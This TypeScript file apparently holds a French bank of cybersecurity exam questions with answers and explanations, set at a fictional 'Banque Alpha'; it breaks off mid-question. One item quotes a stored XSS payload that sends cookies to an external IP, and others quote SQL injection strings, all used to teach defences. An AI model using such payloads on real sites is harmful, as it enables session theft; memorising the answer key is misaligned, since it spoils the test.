const banqueCyberA: QcmQuestion[] = [
  // ───────────────────────────── Réseaux ─────────────────────────────
  {
    id: 'CYB-NET-001',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Réseaux',
    difficulte: 'facile',
    enonce:
      "En analysant les journaux du pare-feu périmétrique de la Banque Alpha, vous relevez les entrées ci-dessous. Quel service du serveur 192.168.10.25 est directement exposé à Internet ?",
    extrait: {
      langage: 'log',
      contenu: `2026-03-14T02:11:07Z ALLOW TCP 203.0.113.45:51544 -> 192.168.10.25:3389 IN=wan OUT=lan
2026-03-14T02:11:09Z ALLOW TCP 203.0.113.45:51547 -> 192.168.10.25:3389 IN=wan OUT=lan
2026-03-14T02:11:12Z ALLOW TCP 203.0.113.45:51552 -> 192.168.10.25:3389 IN=wan OUT=lan`,
    },
    options: [
      { id: 'A', texte: "Le service d'administration à distance SSH" },
      { id: 'B', texte: 'Le partage de fichiers Windows SMB' },
      { id: 'C', texte: 'Le bureau à distance Windows (RDP)' },
      { id: 'D', texte: 'Le moteur de base de données SQL Server' },
    ],
    bonneReponse: 'C',
    explication:
      "Le port TCP 3389 est le port par défaut du protocole RDP (Remote Desktop Protocol). Les connexions répétées depuis une même adresse externe suggèrent une tentative d'attaque par force brute. Un accès RDP ne doit jamais être publié directement sur Internet : il doit passer par un VPN ou un bastion avec MFA.",
    pourquoiPas: {
      A: 'SSH utilise par défaut le port TCP 22, et non le 3389.',
      B: 'SMB utilise le port TCP 445, absent de ces journaux.',
      D: 'SQL Server écoute par défaut sur le port TCP 1433.',
    },
    aRetenir: '22 = SSH, 53 = DNS, 443 = HTTPS, 445 = SMB, 1433 = SQL Server, 3389 = RDP.',
  },
  {
    id: 'CYB-NET-002',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Réseaux',
    difficulte: 'facile',
    enonce:
      "Une capture réseau entre le poste d'un agent et le serveur de compensation montre, sur le port 443, la séquence SYN → SYN-ACK → ACK, puis plus rien pour l'instant. Que peut-on en conclure ?",
    options: [
      { id: 'A', texte: 'La connexion TCP est établie ; les échanges applicatifs peuvent commencer.' },
      { id: 'B', texte: 'La session TLS est négociée et le flux est déjà chiffré de bout en bout.' },
      { id: 'C', texte: 'Le serveur a refusé la connexion, car le port 443 est fermé.' },
      { id: 'D', texte: "Il s'agit d'un échange UDP, sans connexion ni garantie de livraison des paquets transmis." },
    ],
    bonneReponse: 'A',
    explication:
      "SYN, SYN-ACK puis ACK constituent la poignée de main en trois temps de TCP : à son issue, la connexion est établie. La négociation TLS (ClientHello, ServerHello…) n'intervient qu'ensuite, au-dessus de TCP. Cette poignée de main est propre à TCP, protocole orienté connexion.",
    pourquoiPas: {
      B: "La poignée de main TLS commence après l'établissement TCP ; rien n'est encore chiffré à ce stade.",
      C: 'Un port fermé répond par un segment RST, et non par un SYN-ACK.',
      D: "UDP est sans connexion : il n'utilise ni SYN ni ACK.",
    },
    aRetenir: "Poignée de main TCP : SYN, SYN-ACK, ACK ; TLS ne démarre qu'après.",
  },
  {
    id: 'CYB-NET-003',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Réseaux',
    difficulte: 'moyen',
    enonce:
      "Les postes de la salle des marchés sont dans le VLAN 20 et le serveur de compensation dans le VLAN 40. La politique impose que ces postes ne joignent le serveur que sur TCP/443. Quel dispositif permet d'appliquer ce contrôle ?",
    options: [
      { id: 'A', texte: "Le commutateur d'accès, en plaçant tous les ports dans le même VLAN" },
      { id: 'B', texte: 'Le DNS interne, en ne résolvant le nom du serveur que pour ces postes' },
      { id: 'C', texte: 'Le protocole Spanning Tree activé sur les commutateurs du site' },
      { id: 'D', texte: 'Un pare-feu ou routeur assurant le routage inter-VLAN avec des ACL' },
    ],
    bonneReponse: 'D',
    explication:
      "Les VLAN isolent les domaines de diffusion au niveau 2 ; pour passer d'un VLAN à l'autre, le trafic doit être routé (couche 3). C'est à ce point de passage qu'un pare-feu ou des listes de contrôle d'accès filtrent par adresse IP et par port (couche 4). On obtient ainsi une segmentation réelle, avec un flux autorisé unique vers le port 443.",
    pourquoiPas: {
      A: 'Fusionner les VLAN supprime la segmentation au lieu de la contrôler.',
      B: "Masquer un nom DNS n'empêche pas une connexion directe par adresse IP.",
      C: 'STP prévient les boucles de niveau 2 et ne filtre aucun flux applicatif.',
    },
    aRetenir: 'Le VLAN segmente ; le filtrage entre segments se fait au point de routage (pare-feu, ACL).',
  },
  {
    id: 'CYB-NET-004',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Réseaux',
    difficulte: 'difficile',
    enonce:
      "Le serveur de compensation a l'adresse 10.20.30.70/27. Laquelle des adresses suivantes peut être attribuée à un autre hôte du même sous-réseau, joignable sans passer par un routeur ?",
    options: [
      { id: 'A', texte: '10.20.30.63' },
      { id: 'B', texte: '10.20.30.94' },
      { id: 'C', texte: '10.20.30.95' },
      { id: 'D', texte: '10.20.30.96' },
    ],
    bonneReponse: 'B',
    explication:
      "Un masque /27 laisse 5 bits d'hôte, soit des blocs de 32 adresses : 0, 32, 64, 96… L'adresse .70 appartient au bloc 10.20.30.64/27, dont l'adresse réseau est .64 et l'adresse de diffusion .95. Les hôtes utilisables vont donc de .65 à .94 : seule 10.20.30.94 convient.",
    pourquoiPas: {
      A: '10.20.30.63 est la diffusion du sous-réseau précédent (.32/27), hors du bloc .64–.95.',
      C: "10.20.30.95 est l'adresse de diffusion du sous-réseau et ne peut être attribuée à un hôte.",
      D: "10.20.30.96 est l'adresse réseau du sous-réseau suivant (.96/27).",
    },
    aRetenir: '/27 = blocs de 32 : réseau = multiple de 32, diffusion = réseau + 31, hôtes entre les deux.',
  },
  {
    id: 'CYB-NET-005',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Réseaux',
    difficulte: 'moyen',
    enonce:
      "Des agents de la Banque Alpha saisissent l'adresse exacte du portail interbancaire mais aboutissent sur une copie frauduleuse : le résolveur DNS interne a mis en cache une réponse falsifiée. Quelle mesure traite directement cette attaque ?",
    options: [
      { id: 'A', texte: 'Migrer le portail vers HTTP/2 pour accélérer le chargement des pages' },
      { id: 'B', texte: 'Allonger le TTL des enregistrements pour limiter les requêtes DNS' },
      { id: 'C', texte: 'Activer la validation DNSSEC sur le résolveur interne' },
      { id: 'D', texte: 'Ouvrir le port TCP 53 entrant sur le pare-feu périmétrique' },
    ],
    bonneReponse: 'C',
    explication:
      "Il s'agit d'un empoisonnement de cache DNS : le résolveur a accepté une réponse forgée. DNSSEC signe les enregistrements de la zone, et un résolveur validant rejette toute réponse dont la signature ne remonte pas à une ancre de confiance. HTTPS avec un certificat valide reste une seconde barrière, à condition que les utilisateurs n'ignorent pas les alertes.",
    pourquoiPas: {
      A: "HTTP/2 améliore les performances mais n'agit pas sur la résolution DNS.",
      B: 'Un TTL long prolonge au contraire la durée de vie d’une entrée empoisonnée dans le cache.',
      D: "Ouvrir TCP/53 en entrée augmente la surface d'attaque sans authentifier les réponses.",
    },
    aRetenir: "Contre l'empoisonnement DNS : DNSSEC, qui authentifie l'origine des réponses.",
  },
  {
    id: 'CYB-NET-006',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Réseaux',
    difficulte: 'moyen',
    enonce:
      "Voici un extrait des règles du pare-feu périmétrique de la Banque Alpha. Le portail public est hébergé en DMZ (172.16.1.0/24) et le réseau interne est 10.0.0.0/8. Quelle règle contredit le principe même de la DMZ ?",
    extrait: {
      langage: 'texte',
      contenu: `# Pare-feu périmétrique — Banque Alpha (traitement de haut en bas)
1  permit tcp any            -> 198.51.100.10 eq 443   # DNAT vers 172.16.1.10 (portail, DMZ)
2  permit tcp 172.16.1.10/32 -> 10.0.5.20     eq 1433  # portail -> base de données interne
3  permit ip  172.16.1.0/24  -> 10.0.0.0/8    any      # « temporaire » : migration 2024
4  deny   ip  any            -> any                    # refus par défaut`,
    },
    options: [
      { id: 'A', texte: 'La règle 3, qui ouvre tout le réseau interne à toute la DMZ' },
      { id: 'B', texte: 'La règle 1, qui publie le portail sur Internet par translation' },
      { id: 'C', texte: 'La règle 2, qui autorise le portail à joindre sa base de données' },
      { id: 'D', texte: 'La règle 4, qui refuse tout flux non explicitement autorisé' },
    ],
    bonneReponse: 'A',
    explication:
      "La DMZ héberge des serveurs exposés, donc susceptibles d'être compromis ; ses flux vers le réseau interne doivent être limités au strict nécessaire. La règle 3 autorise tout protocole de toute la DMZ vers tout le réseau interne : un attaquant qui compromet le portail pourrait rebondir partout. Les règles « temporaires » oubliées sont un classique des audits de pare-feu.",
    pourquoiPas: {
      B: "Publier le portail en HTTPS via une translation d'adresse (DNAT) est la raison d'être de la DMZ.",
      C: 'Ce flux est restreint à une source, une destination et un port précis : il est justifiable.',
      D: 'Le refus par défaut en fin de politique est une bonne pratique, pas une faiblesse.',
    },
    aRetenir: 'DMZ → interne : uniquement des flux nominatifs (source, destination, port), jamais « any ».',
  },
  {
    id: 'CYB-NET-007',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Réseaux',
    difficulte: 'moyen',
    enonce:
      "Le pare-feu stateful de la Banque Alpha laisse passer vers le portail une requête HTTPS dont un paramètre contient « ' OR 1=1 -- ». Pourquoi cette requête n'a-t-elle pas été bloquée ?",
    options: [
      { id: 'A', texte: "Parce que les injections SQL circulent en UDP, que ce pare-feu ne suit pas." },
      {
        id: 'B',
        texte: "Parce qu'un pare-feu stateful suit les connexions (IP, ports, état TCP) sans analyser le contenu HTTP.",
      },
      { id: 'C', texte: 'Parce qu’un pare-feu stateful ne filtre que le trafic sortant, jamais les connexions entrantes vers la DMZ.' },
      { id: 'D', texte: "Parce que la règle de refus par défaut n'était pas placée en tête de politique." },
    ],
    bonneReponse: 'B',
    explication:
      "Un pare-feu stateful décide à partir des en-têtes réseau et de l'état des sessions : une connexion légitime vers TCP/443 est autorisée, quel que soit son contenu. Détecter une injection SQL exige d'inspecter la couche applicative, ce que fait un pare-feu applicatif web (WAF), placé après la terminaison TLS. Le WAF complète, sans la remplacer, la correction du code (requêtes paramétrées).",
    pourquoiPas: {
      A: 'HTTPS repose sur TCP ; une injection SQL voyage dans une requête HTTP sur TCP.',
      C: 'Un pare-feu stateful filtre dans les deux sens, entrant comme sortant.',
      D: 'Un refus placé en tête bloquerait tout, y compris le trafic légitime vers le portail.',
    },
    aRetenir: 'Pare-feu stateful = couches 3-4 ; WAF = couche 7 (contenu HTTP).',
  },
  {
    id: 'CYB-NET-008',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Réseaux',
    difficulte: 'difficile',
    enonce:
      "Le serveur DNS faisant autorité pour la zone de la Banque Alpha journalise les lignes suivantes. Que s'est-il passé et quelle est la correction appropriée ?",
    extrait: {
      langage: 'log',
      contenu: `Mar 14 03:12:44 ns1 named[812]: client @0x7f3a2c 203.0.113.77#40112 (banque-alpha.example): transfer of 'banque-alpha.example/IN': AXFR started (serial 2026031401)
Mar 14 03:12:44 ns1 named[812]: client @0x7f3a2c 203.0.113.77#40112 (banque-alpha.example): transfer of 'banque-alpha.example/IN': AXFR ended: 1 messages, 214 records, 6120 bytes, 0.004 secs`,
    },
    options: [
      {
        id: 'A',
        texte: 'Un empoisonnement de cache par UDP ; il faut activer la validation DNSSEC sur ns1.',
      },
      {
        id: 'B',
        texte: 'Une attaque par amplification DNS ; il faut limiter le débit des réponses UDP.',
      },
      {
        id: 'C',
        texte: 'Une simple requête récursive ; il faut seulement réduire le TTL de la zone.',
      },
      {
        id: 'D',
        texte: 'Un transfert de zone complet vers une IP externe ; il faut restreindre allow-transfer (et signer par TSIG).',
      },
    ],
    bonneReponse: 'D',
    explication:
      "AXFR est un transfert de zone complet, réalisé sur TCP/53, normalement réservé aux serveurs secondaires. Ici, une adresse externe inconnue a récupéré les 214 enregistrements de la zone, ce qui lui fournit une cartographie de l'infrastructure (noms et adresses de serveurs). Il faut restreindre les transferts aux secondaires autorisés (allow-transfer) et les authentifier par TSIG.",
    pourquoiPas: {
      A: "Un serveur faisant autorité n'a pas de cache à empoisonner, et AXFR n'est pas une réponse falsifiée.",
      B: "L'amplification exploite des réponses UDP vers une victime usurpée, pas un transfert TCP de 6 Ko.",
      C: 'Une requête récursive porte sur un nom précis ; AXFR exporte toute la zone.',
    },
    aRetenir: 'AXFR ouvert = fuite de la cartographie DNS : limiter aux secondaires et signer par TSIG.',
  },

  // ─────────────────────────── Cryptographie ───────────────────────────
  {
    id: 'CYB-CRY-001',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Cryptographie',
    difficulte: 'facile',
    enonce:
      "Chaque nuit, le serveur de compensation doit chiffrer plusieurs gigaoctets de fichiers de règlement avant leur archivage. Quel algorithme est adapté au chiffrement de ce volume de données ?",
    options: [
      { id: 'A', texte: 'RSA-2048 appliqué directement à chaque fichier' },
      { id: 'B', texte: 'AES-256 en mode GCM' },
      { id: 'C', texte: 'SHA-256 appliqué à chaque fichier' },
      { id: 'D', texte: 'Un encodage Base64 des fichiers' },
    ],
    bonneReponse: 'B',
    explication:
      "AES est un algorithme symétrique rapide, conçu pour chiffrer de gros volumes ; le mode GCM assure en outre l'authenticité (chiffrement authentifié). Les algorithmes asymétriques comme RSA servent plutôt à échanger ou protéger la clé AES (chiffrement hybride) et à signer.",
    pourquoiPas: {
      A: 'RSA est lent et ne chiffre directement que des blocs de quelques centaines d’octets.',
      C: 'SHA-256 est une fonction de hachage : elle ne chiffre pas et le résultat est irréversible.',
      D: "Base64 est un simple encodage réversible par n'importe qui, sans aucune clé.",
    },
    aRetenir: 'Gros volumes : symétrique (AES-GCM) ; échange de clés et signature : asymétrique.',
  },
  {
    id: 'CYB-CRY-002',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Cryptographie',
    difficulte: 'facile',
    enonce:
      "Une application interne calcule l'empreinte MD5 des fichiers de paiement échangés afin d'en contrôler l'intégrité. Quel est le principal problème de ce choix ?",
    options: [
      { id: 'A', texte: 'MD5 est un chiffrement réversible : toute personne interceptant l’empreinte retrouve le contenu des fichiers.' },
      { id: 'B', texte: "MD5 produit une empreinte trop longue pour être stockée en base." },
      { id: 'C', texte: "MD5 exige une clé privée que l'application ne peut pas protéger." },
      { id: 'D', texte: 'Des collisions MD5 se fabriquent en pratique : il faut au moins SHA-256.' },
    ],
    bonneReponse: 'D',
    explication:
      "Une fonction de hachage sûre doit résister aux collisions : il doit être infaisable de trouver deux contenus de même empreinte. Pour MD5 (et SHA-1), des collisions se calculent en pratique, ce qui permet de substituer un fichier frauduleux de même empreinte. On utilise SHA-256 ou SHA-3, et un HMAC ou une signature si l'on veut aussi authentifier l'émetteur.",
    pourquoiPas: {
      A: 'MD5 est une fonction de hachage à sens unique, pas un chiffrement réversible.',
      B: "L'empreinte MD5 ne fait que 128 bits, ce qui est court et non problématique en stockage.",
      C: "Une fonction de hachage n'utilise aucune clé ; c'est le HMAC qui en ajoute une.",
    },
    aRetenir: 'MD5 et SHA-1 sont cassés en collision : utiliser SHA-256 ou plus.',
  },
  {
    id: 'CYB-CRY-003',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Cryptographie',
    difficulte: 'moyen',
    enonce:
      "Voici la fonction qui enregistre les mots de passe des agents dans l'application de gestion des réserves. Quelle correction est la plus appropriée ?",
    extrait: {
      langage: 'python',
      contenu: `import hashlib

def enregistrer_mot_de_passe(login, mot_de_passe):
    empreinte = hashlib.sha256(mot_de_passe.encode()).hexdigest()
    db.execute(
        "UPDATE agents SET mdp = %s WHERE login = %s",
        (empreinte, login),
    )`,
    },
    options: [
      { id: 'A', texte: 'Utiliser une fonction lente et salée (Argon2id ou bcrypt), avec un sel unique par compte' },
      { id: 'B', texte: "Remplacer SHA-256 par SHA-512 pour obtenir une empreinte deux fois plus longue" },
      { id: 'C', texte: 'Chiffrer le mot de passe en AES-256 et conserver la clé de chiffrement dans une table dédiée de la même base' },
      { id: 'D', texte: "Encoder le mot de passe en Base64 avant de calculer l'empreinte SHA-256" },
    ],
    bonneReponse: 'A',
    explication:
      "Un SHA-256 sans sel est très rapide à calculer : en cas de fuite, les mots de passe sont cassés par tables précalculées ou par force brute sur GPU. Les fonctions de dérivation dédiées (Argon2id, bcrypt, scrypt, PBKDF2) sont volontairement coûteuses et intègrent un sel aléatoire unique par compte. C'est ce que recommandent le NIST (SP 800-63B) et l'OWASP.",
    pourquoiPas: {
      B: 'SHA-512 reste rapide et non salé : il ne ralentit pas significativement un attaquant.',
      C: "Un mot de passe chiffré est réversible ; avec la clé dans la même base, la fuite est totale.",
      D: "Base64 n'ajoute aucun secret ni aucun coût de calcul : la faiblesse reste entière.",
    },
    aRetenir: 'Mots de passe : jamais de hachage rapide ; Argon2id ou bcrypt avec sel unique.',
  },
  {
    id: 'CYB-CRY-004',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Cryptographie',
    difficulte: 'moyen',
    enonce:
      "La Banque Alpha transmet un ordre de virement signé numériquement à la chambre de compensation. Quelle clé sert à signer, et laquelle sert à vérifier la signature ?",
    options: [
      { id: 'A', texte: 'Signature avec la clé publique de la chambre, vérification avec sa clé privée' },
      { id: 'B', texte: 'Signature avec la clé privée de la chambre, vérification avec la clé publique d’Alpha' },
      { id: 'C', texte: 'Signature avec la clé privée d’Alpha, vérification avec la clé publique d’Alpha' },
      { id: 'D', texte: 'Signature et vérification avec une même clé secrète AES partagée' },
    ],
    bonneReponse: 'C',
    explication:
      "Seul l'émetteur détient sa clé privée : signer avec elle prouve l'origine du message et en garantit l'intégrité. N'importe quel destinataire vérifie ensuite la signature avec la clé publique de l'émetteur, obtenue via son certificat. C'est ce qui fonde la non-répudiation de l'ordre de paiement.",
    pourquoiPas: {
      A: "Utiliser la clé publique du destinataire, c'est chiffrer pour lui, pas signer.",
      B: 'La Banque Alpha ne possède pas la clé privée de la chambre, et les clés ne sont pas appariées.',
      D: "Une clé partagée produit un MAC : l'un ou l'autre a pu le calculer, donc pas de non-répudiation.",
    },
    aRetenir: "On signe avec SA clé privée ; on vérifie avec la clé publique de l'émetteur.",
  },
  {
    id: 'CYB-CRY-005',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Cryptographie',
    difficulte: 'difficile',
    enonce:
      "Après le renouvellement du certificat du portail, plusieurs banques participantes signalent des erreurs de connexion. Vous lancez la commande ci-dessous. Quelle est la cause la plus probable ?",
    extrait: {
      langage: 'texte',
      contenu: `$ openssl s_client -connect portail.banque-alpha.example:443 -servername portail.banque-alpha.example
CONNECTED(00000003)
depth=0 CN = portail.banque-alpha.example
verify error:num=20:unable to get local issuer certificate
verify error:num=21:unable to verify the first certificate
---
Certificate chain
 0 s:CN = portail.banque-alpha.example
   i:O = AC Exemple, CN = AC Exemple Serveurs TLS R2
---`,
    },
    options: [
      { id: 'A', texte: 'Le certificat du serveur est arrivé à expiration' },
      { id: 'B', texte: "Le serveur n'envoie pas le certificat de l'AC intermédiaire" },
      { id: 'C', texte: "Le nom du certificat ne correspond pas au nom d'hôte demandé" },
      { id: 'D', texte: 'La clé privée du serveur a été révoquée par l’AC racine' },
    ],
    bonneReponse: 'B',
    explication:
      "La chaîne présentée ne contient qu'un seul certificat (depth 0), émis par une AC intermédiaire que le client ne trouve pas dans son magasin. Sans ce maillon, il ne peut pas remonter jusqu'à une AC racine de confiance, d'où les erreurs 20 et 21. Il faut configurer le serveur avec la chaîne complète (certificat serveur suivi du ou des intermédiaires).",
    pourquoiPas: {
      A: "Une expiration produirait l'erreur « certificate has expired » (code 10).",
      C: 'Le CN affiché correspond exactement au nom demandé, et OpenSSL ne lève pas ici d’erreur de nom.',
      D: "On révoque un certificat (via CRL ou OCSP), et cela ne produirait pas ces codes d'erreur.",
    },
    aRetenir: 'Toujours servir la chaîne complète : certificat serveur + AC intermédiaires.',
  },
  {
    id: 'CYB-CRY-006',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Cryptographie',
    difficulte: 'difficile',
    enonce:
      "Un attaquant enregistre pendant un an tout le trafic TLS 1.3 du portail interbancaire, puis dérobe la clé privée associée au certificat du serveur. Que peut-il déchiffrer parmi les sessions enregistrées ?",
    options: [
      {
        id: 'A',
        texte: 'Toutes les sessions, car la clé privée RSA chiffre le secret de session envoyé par le client.',
      },
      {
        id: 'B',
        texte: "Uniquement les sessions de la dernière heure, durée de vie maximale d'une clé de session.",
      },
      {
        id: 'C',
        texte: "Toutes les sessions, à condition de disposer aussi du certificat de l'AC racine.",
      },
      {
        id: 'D',
        texte: "Aucune : les clés de session viennent d'un échange (EC)DHE éphémère, la clé privée ne fait que signer.",
      },
    ],
    bonneReponse: 'D',
    explication:
      "TLS 1.3 a supprimé l'échange de clés RSA statique : chaque session dérive ses clés d'un échange Diffie-Hellman éphémère dont les secrets sont détruits ensuite. La clé privée du certificat sert uniquement à signer la poignée de main pour authentifier le serveur. C'est la confidentialité persistante (Perfect Forward Secrecy) ; le vol de la clé permet en revanche d'usurper le serveur à l'avenir, d'où la révocation immédiate.",
    pourquoiPas: {
      A: "Ce scénario décrit l'échange RSA de TLS 1.2 et antérieurs, supprimé en TLS 1.3.",
      B: "Aucune fenêtre d'une heure n'existe : sans les secrets éphémères, même les sessions récentes restent protégées.",
      C: "Le certificat racine est public et ne contient aucun secret permettant de déchiffrer.",
    },
    aRetenir: 'TLS 1.3 = (EC)DHE éphémère obligatoire = PFS : le vol de la clé ne dévoile pas le passé.',
  },
  {
    id: 'CYB-CRY-007',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Cryptographie',
    difficulte: 'facile',
    enonce:
      "Pourquoi une institution financière conserve-t-elle les clés de signature de ses messages de paiement dans un HSM (Hardware Security Module) ?",
    options: [
      { id: 'A', texte: "La clé est générée et utilisée dans un boîtier certifié, sans jamais en sortir en clair." },
      { id: 'B', texte: 'Le HSM compresse les messages de paiement pour accélérer leur transmission.' },
      { id: 'C', texte: 'Le HSM remplace le pare-feu en filtrant les flux vers le système de paiement.' },
      { id: 'D', texte: "Le HSM exporte régulièrement les clés en clair sur un support amovible pour faciliter la reprise d'activité." },
    ],
    bonneReponse: 'A',
    explication:
      "Un HSM est un équipement matériel durci, certifié (FIPS 140-2/140-3, Critères communs), qui génère, stocke et utilise les clés en son sein. Les applications lui demandent de signer ou de déchiffrer, mais la clé privée n'est jamais exposée en clair. Toute tentative d'intrusion physique déclenche l'effacement des secrets.",
    pourquoiPas: {
      B: "Un HSM effectue des opérations cryptographiques, pas de la compression réseau.",
      C: 'Un HSM ne filtre aucun trafic réseau ; il ne remplace pas un pare-feu.',
      D: "Exporter des clés en clair irait à l'encontre de sa raison d'être ; les sauvegardes restent chiffrées.",
    },
    aRetenir: 'HSM : la clé privée est utilisée dans le boîtier et n’en sort jamais en clair.',
  },
  {
    id: 'CYB-CRY-008',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Cryptographie',
    difficulte: 'moyen',
    enonce:
      "Les sauvegardes de la base des comptes de règlement sont transférées chaque nuit vers le site de secours par une liaison TLS, puis stockées sur bandes non chiffrées. Quel écart un auditeur doit-il relever ?",
    options: [
      { id: 'A', texte: "TLS ne garantit pas l'intégrité des données transférées vers le site de secours." },
      { id: 'B', texte: 'Les bandes devraient porter une empreinte MD5 pour être considérées chiffrées.' },
      { id: 'C', texte: 'Le chiffrement en transit ne protège pas les données une fois stockées sur les bandes.' },
      { id: 'D', texte: "TLS est superflu sur une liaison interne entre deux sites de la banque ; seul le stockage final doit être protégé." },
    ],
    bonneReponse: 'C',
    explication:
      "TLS protège les données pendant leur transport uniquement ; à l'arrivée, elles sont déchiffrées puis écrites en clair sur les bandes. Une bande volée ou perdue exposerait alors toute la base. Il faut chiffrer aussi au repos (par exemple AES-256), avec des clés gérées séparément du support, idéalement dans un HSM ou un KMS.",
    pourquoiPas: {
      A: "TLS assure l'intégrité (AEAD) en plus de la confidentialité pendant le transfert.",
      B: "Une empreinte MD5 n'est pas un chiffrement et ne protège pas la confidentialité.",
      D: 'Une liaison interne peut être écoutée ; il faut protéger en transit ET au repos.',
    },
    aRetenir: 'Transit et repos sont deux protections distinctes : il faut les deux.',
  },

  // ─────────────────── Sécurité applicative (OWASP) ───────────────────
  {
    id: 'CYB-WEB-001',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Sécurité applicative (OWASP)',
    difficulte: 'facile',
    enonce:
      "Le service de relevés du portail interbancaire contient le code suivant. Quelle correction élimine la vulnérabilité d'injection SQL ?",
    extrait: {
      langage: 'python',
      contenu: `@app.route("/releve")
def releve():
    compte = request.args.get("compte")
    sql = f"SELECT date, libelle, montant FROM operations WHERE compte = '{compte}'"
    return jsonify(db.execute(sql).fetchall())`,
    },
    options: [
      { id: 'A', texte: "Supprimer les apostrophes du paramètre avec compte.replace(\"'\", \"\")" },
      { id: 'B', texte: 'Faire passer la route en POST afin que le numéro de compte n’apparaisse plus dans l’URL ni dans les journaux' },
      { id: 'C', texte: 'Chiffrer la colonne compte dans la base de données des opérations' },
      { id: 'D', texte: 'Utiliser une requête paramétrée : execute("… WHERE compte = %s", (compte,))' },
    ],
    bonneReponse: 'D',
    explication:
      "Le paramètre est concaténé directement dans la requête : une valeur comme « x' OR '1'='1 » en modifie la logique. Avec une requête paramétrée, le pilote transmet la valeur séparément du code SQL, qui ne peut plus être altéré. C'est la défense principale contre l'injection (OWASP A03:2021).",
    pourquoiPas: {
      A: 'Un filtrage par liste noire se contourne (encodages, injections numériques) et reste fragile.',
      B: "Un paramètre POST est tout aussi contrôlable par l'attaquant qu'un paramètre GET.",
      C: "Le chiffrement au repos n'empêche pas de modifier la structure de la requête.",
    },
    aRetenir: 'Contre l’injection SQL : requêtes paramétrées, jamais de concaténation.',
  },
  {
    id: 'CYB-WEB-002',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Sécurité applicative (OWASP)',
    difficulte: 'moyen',
    enonce:
      "Sur l'espace d'échange du portail, un utilisateur publie le commentaire « <script>fetch('https://203.0.113.9/c?'+document.cookie)</script> ». Le gabarit d'affichage est reproduit ci-dessous. De quelle vulnérabilité s'agit-il et comment la corriger ?",
    extrait: {
      langage: 'texte',
      contenu: `<!-- commentaires.html (Jinja2) -->
{% for c in commentaires %}
  <div class="commentaire">
    <b>{{ c.auteur }}</b> : {{ c.texte | safe }}
  </div>
{% endfor %}`,
    },
    options: [
      { id: 'A', texte: 'Injection SQL : utiliser des requêtes paramétrées pour enregistrer le texte' },
      { id: 'B', texte: "XSS stockée : retirer « | safe » pour rétablir l'échappement, et ajouter une CSP" },
      { id: 'C', texte: 'CSRF : ajouter un jeton anti-CSRF au formulaire de publication' },
      { id: 'D', texte: 'SSRF : filtrer les URL que le serveur du portail est autorisé à appeler' },
    ],
    bonneReponse: 'B',
    explication:
      "Le filtre « safe » désactive l'échappement HTML automatique : le script stocké en base s'exécute dans le navigateur de chaque agent qui consulte la page. C'est une XSS stockée (catégorie Injection, A03:2021). On corrige par l'encodage de sortie, et on limite l'impact par une Content-Security-Policy et des cookies HttpOnly.",
    pourquoiPas: {
      A: "Le texte est stocké tel quel sans altérer de requête : le problème survient à l'affichage, pas en base.",
      C: "La CSRF force une action à l'insu de la victime ; ici, du code s'exécute dans la page.",
      D: "La requête vers 203.0.113.9 part du navigateur de la victime, pas du serveur.",
    },
    aRetenir: 'XSS : encoder toute donnée utilisateur à l’affichage ; CSP et HttpOnly en défense en profondeur.',
  },
  {
    id: 'CYB-WEB-003',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Sécurité applicative (OWASP)',
    difficulte: 'moyen',
    enonce:
      "L'utilisateur « agent.beta », employé de la Banque Beta, est authentifié sur le portail interbancaire. Les comptes interrogés appartiennent tous à la Banque Gamma. Quelle vulnérabilité ces journaux révèlent-ils ?",
    extrait: {
      langage: 'log',
      contenu: `192.168.20.31 - agent.beta [14/Mar/2026:10:02:11 +0100] "GET /api/v1/releves?compte=GAMMA-0042-118 HTTP/1.1" 200 1843
192.168.20.31 - agent.beta [14/Mar/2026:10:02:14 +0100] "GET /api/v1/releves?compte=GAMMA-0042-119 HTTP/1.1" 200 1920
192.168.20.31 - agent.beta [14/Mar/2026:10:02:16 +0100] "GET /api/v1/releves?compte=GAMMA-0042-120 HTTP/1.1" 200 1777`,
    },
    options: [
      { id: 'A', texte: 'Un contrôle d’accès défaillant (IDOR) : le serveur ne vérifie pas le périmètre de l’utilisateur' },
      { id: 'B', texte: "Une injection SQL dans le paramètre compte, exploitée pour lister la table" },
      { id: 'C', texte: "Une défaillance cryptographique : l'identifiant de compte devrait être chiffré ou haché dans l'URL de l'API" },
      { id: 'D', texte: 'Une attaque par force brute sur le mot de passe du compte agent.beta' },
    ],
    bonneReponse: 'A',
    explication:
      "En modifiant simplement l'identifiant dans l'URL, l'utilisateur obtient (code 200) les relevés de comptes qui ne relèvent pas de sa banque : c'est une référence directe non sécurisée à un objet (IDOR). Elle relève du contrôle d'accès défaillant, première catégorie de l'OWASP Top 10 2021 (A01). Le serveur doit vérifier, à chaque requête, que l'objet demandé appartient au périmètre de l'utilisateur authentifié.",
    pourquoiPas: {
      B: 'Les valeurs sont des identifiants valides, sans aucune syntaxe SQL injectée.',
      C: "Masquer l'identifiant relève de l'obscurité ; seule une vérification d'autorisation côté serveur corrige.",
      D: "L'utilisateur est déjà authentifié ; il ne cherche pas son mot de passe mais des objets d'autrui.",
    },
    aRetenir: 'IDOR = A01 : vérifier côté serveur, à chaque requête, le droit sur l’objet demandé.',
  },
  {
    id: 'CYB-WEB-004',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Sécurité applicative (OWASP)',
    difficulte: 'difficile',
    enonce:
      "Le portail, hébergé dans un cloud public, propose d'importer un justificatif à partir d'une URL. Un testeur obtient l'échange ci-dessous. Quelle vulnérabilité est démontrée et quelle correction prioriser ?",
    extrait: {
      langage: 'texte',
      contenu: `POST /api/import-justificatif HTTP/1.1
Host: portail.banque-alpha.example
Content-Type: application/json

